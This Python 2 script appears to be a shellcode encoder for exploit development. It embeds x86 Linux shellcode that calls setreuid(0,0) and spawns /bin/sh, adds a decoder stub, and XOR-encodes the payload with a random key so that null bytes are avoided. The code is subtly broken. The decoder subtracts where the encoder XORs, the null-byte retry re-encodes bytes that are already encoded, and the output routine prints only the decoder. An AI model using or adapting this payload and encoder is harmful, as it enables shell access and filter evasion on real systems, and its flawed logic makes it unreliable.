import os
import sys
import getopt
import random
no_nulls = 0
decorder = bytearray("\xeb\x11\x5e\x31\xc9\xb1\x17\x80\x6c\x0e\xff\x03"
"\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff")
shellcode = bytearray("\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\x31\xc0"
	"\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")

def show():
	lensc = len(shellcode)
	lendc = len(decorder)
	sys.stdout.write("\n/* Decoder + Shellcode */\n\n")
	sys.stdout.write("char polysc[] = \"")
	j = 0
	for i in range(lendc):
		if j > 12:
			sys.stdout.write("\"\n\t\t\"")
			j = 0
		sys.stdout.write("\\x%02x" % decorder[i])
		j += 1
	sys.stdout.write("\";\n\n")

def encode(newkey):
	key = newkey
	lensc = len(shellcode)
	decorder[6] = lensc	
	decorder[11] = key
	print "[+] Encoding with key 0x%x..." % key
	for i in range(lensc):
		shellcode[i] ^=key
		if no_nulls != 0:
			if shellcode[i] == 0x00:
				print "[!] Byte null generated. Trying random key value..."
				key = random.randint(0,255)
				encode(key)

if __name__ == '__main__':
	key = 0x00
	try:
		opts, args = getopt.getopt(sys.argv[1:], "nk:", ["--no-null", "--key="])
	except getopt.GetoptError:
		print "Uso: " + sys.argv[0] + " [-n] [-k key]"
		sys.exit(1)
	for opt,arg in opts:
		if opt in ("-n", "--no-null"):
			no_nulls = 1
		elif opt in ("-k", "--key"):
			if int(arg) < 1 or int(arg) > 255:
				print "[-] Error. key valid range (0x01 - 0xff)"
				sys.exit(1)
			key = int(arg)
	if key == 0x00:
		print "[+] Selecting random key..."
		key = random.randint(0,255)
	encode(key)
	show()
	